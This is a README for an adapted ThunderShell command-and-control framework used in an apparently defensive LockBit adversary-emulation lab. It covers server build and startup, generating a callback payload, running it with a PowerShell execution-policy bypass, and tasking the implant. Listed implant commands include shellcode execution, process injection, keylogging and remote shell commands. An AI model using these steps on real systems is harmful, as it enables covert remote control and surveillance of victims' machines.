# Thundershell

The original Mr-Un1k0d3r's Thundershell can be found at: <https://github.com/Mr-Un1k0d3r/ThunderShell/tree/master>

- Adopted at [commit ca9c7511725a23a5ccd47b288ce059377f1c5c5c](https://github.com/Mr-Un1k0d3r/ThunderShell/tree/ca9c7511725a23a5ccd47b288ce059377f1c5c5c)
- The original license can be found [here](https://github.com/Mr-Un1k0d3r/ThunderShell/blob/master/LICENSE.md)
- The original README can be found [here](https://github.com/Mr-Un1k0d3r/ThunderShell/blob/master/README.md)

Modifications:

- RC4 encryption removed from [server](https://github.com/Mr-Un1k0d3r/ThunderShell/blob/master/core/httpd.py) and [payload](https://github.com/Mr-Un1k0d3r/ThunderShell/blob/master/data/payloads/stager.cs)
- Connection objected updated to `http.server.ThreadingHTTPServer` [1](https://github.com/Mr-Un1k0d3r/ThunderShell/blob/ca9c7511725a23a5ccd47b288ce059377f1c5c5c/core/httpd.py#L25), [2](https://github.com/Mr-Un1k0d3r/ThunderShell/blob/ca9c7511725a23a5ccd47b288ce059377f1c5c5c/core/httpd.py#L214)

## Usage

This section will detail Thundershell's usage in regards to the LockBit scenario. For more information about the usage of Thundershell, see the original Wiki pages:

- [Home page wiki](https://github.com/Mr-Un1k0d3r/ThunderShell/wiki/Home)
- [Using Thundershell wiki](https://github.com/Mr-Un1k0d3r/ThunderShell/wiki/Using-Thundershell)
- [Features wiki](https://github.com/Mr-Un1k0d3r/ThunderShell/wiki/Features)

**From your Kali terminal:**

1. Navigate to the ThunderShell folder and start the redis server

    ```cmd
    redis-server
    ```

1. In a separate terminal, navigate to the ThunderShell folder and start the Thundershell server

    ```cmd
    python3.7 ThunderShell.py default.json <username>
    ```

    You should see the following output:

    ```cmd
                .#"    =[ ThunderShell version 3.1.2 | RingZer0 Team ]=
            .##"
            .###"       __       __    _________    __            __
        ###P        ###|     ###|  ##########|  ###|          ###|
        d########"    ###|     ###|  ###|         ###|          ###|
        ****####"     ###|_____###|  ###|__       ###|          ###|
        .###"       ############|  ######|      ###|          ###|
        .##"         ###|     ###|  ###|         ###|          ###|
        .#"           ###|     ###|  ###|______   ###|_______   ###|_______
        ."             ###|     ###|  ##########|  ###########|  ###########|


            
    [*] Current active CLI session UUID is 174bd47d-be50-4849-9176-07d03b73c148
    [*] Web GUI Started: http://10.100.0.70:13337
    [*] Web GUI Password: passw0rd!
    [*] Starting web server on 10.100.0.70 port 8080
    ```

1. Run `help` to see possible commands.

    ```cmd
    Help Menu
    =========

    Commands    Args                                  Descriptions
    ----------  ------------------------------------  --------------------------------------------------------------------------------------------
    list        full                                  List all active shells
    interact    id                                    Interact with a session
    show        (password,key,error,http,event) rows  Show server password, encryption key, errors, http or events log (default number of rows 10)
    kill        id                                    kill shell (clear db only)
    os          command                               Execute command on the system (local)
    purge       force                                 WARNING! Delete all the Redis DB
    exit                                              Exit the application
    help                                              Show this help menu
    ```

1. Run `interact <id>` to interact with an active session. Run `help` to see possible commands for the payload.

    ```cmd
    (Main)>>> interact 1

    (BRAVO SABER\drstrange)>>> help
    Help Menu
    =========
    _Commands    __Args                       ___Descriptions
    -----------  ---------------------------  ------------------------------------------------------------
    background                                Return to the main console (CLI only)
    fetch        path/url, cmd                In memory execution of a script and execute a command
    exec         path/url                     In memory execution of code (shellcode)
    read         remote path                  Read a file on the remote host
    upload       path/url, path               Upload a file on the remote system
    ps                                        List processes
    inject       pid, command                 Inject command into a target process (max length 4096)
    keylogger    number of line (default 20)  Show last n line of keystrokes captured
    alias        key, value                   Create an alias to avoid typing the same thing over and over
    delay        milliseconds                 Update the callback delay
    shell        command                      Run command by spawning cmd.exe /c
    screenshot                                Take a screenshot
    help                                      show this help menu

    List of built in aliases
    ------------------------
    wmiexec                     Remote-WmiExecute utility
    searchevent                 Search-EventForUser utility


    List user defined aliases
    --------------------------

    ```

1. Task the Thundershell payload with commands from the session shell:

    ```cmd
    (BRAVO SABER\drstrange)>>> whoami


    (BRAVO SABER\drstrange)>>> 

    [*] drstrange - Sending command: whoami

    (BRAVO SABER\drstrange)>>> 

    [*] Command output:
    saber\drstrange
    ```

**From your Windows host:**

1. To dynamically compile and download the payload from the Thundershell server, navigate to the Web GUI in your browser and sign in with your username and password (GUI url and password printed in command line shell).

1. In the left hand menu select the `Payloads` tab. In the pop up, set the callback address and payload type. Click confirm and verify the payload was downloaded to your `Downloads` folder.

1. Run the payload. To run the powershell payload run the following:

    ```cmd
    powershell -exec bypass import-module .\<file>.ps1
    ```

    You should see the registration in the terminal or `Sessions` tab of the Web GUI.

    ```cmd
    (Main)>>> 
    [+] Registering new shell BRAVO SABER\drstrange
    [+] New shell ID 1 GUID is qs6fUeQ7XzqnTSg3
    [+] Running auto commands on shell SABER\drstrange
            [+] whoami
            [+] screenshot


    (Main)>>> list full
    List of active shells
    ---------------------

    1     BRAVO SABER\drstrange qs6fUeQ7XzqnTSg3 last seen 2024-04-11 15:10:44
    ```

## Build Instructions

The following steps will walk through the setup of the build environment. Thundershell has to be run with python3.7 to accomodate for out of date dependencies. Follow the steps listed [here](https://tecadmin.net/install-python-3-7-on-ubuntu-linuxmint/) to install python3.7 if it is not already installed.

**From your Kali host:**

1. Install dependencies

    ```cmd
    sudo apt install -y mono-mcs redis-server
    ```

1. Navigate to the ThunderShell directory in `LockBit/Resources/ThunderShell`

    ```cmd
    cd LockBit/Resources/ThunderShell/
    ```

1. Enter root shell

    ```cmd
    sudo su
    ```

1. Install Thundershell dependencies

    ```cmd
    python3.7 -m pip install -r requirements.txt
    ```

1. Update the [default.json](https://github.com/Mr-Un1k0d3r/ThunderShell/blob/ca9c7511725a23a5ccd47b288ce059377f1c5c5c/default.json) file with the correct values (server, port, etc.)

1. Start the redis server

    ```cmd
    redis-server
    ```

1. Start the Thundershell server

    ```cmd
    python3.7 ThunderShell.py default.json <username>
    ```

For more information about starting the Thundershell server see [here](https://github.com/Mr-Un1k0d3r/ThunderShell/wiki/Home).

## CTI Reporting

1. <https://isec.ne.jp/wp-content/uploads/2017/10/52ThunderShell.pdf>
1. <https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a>
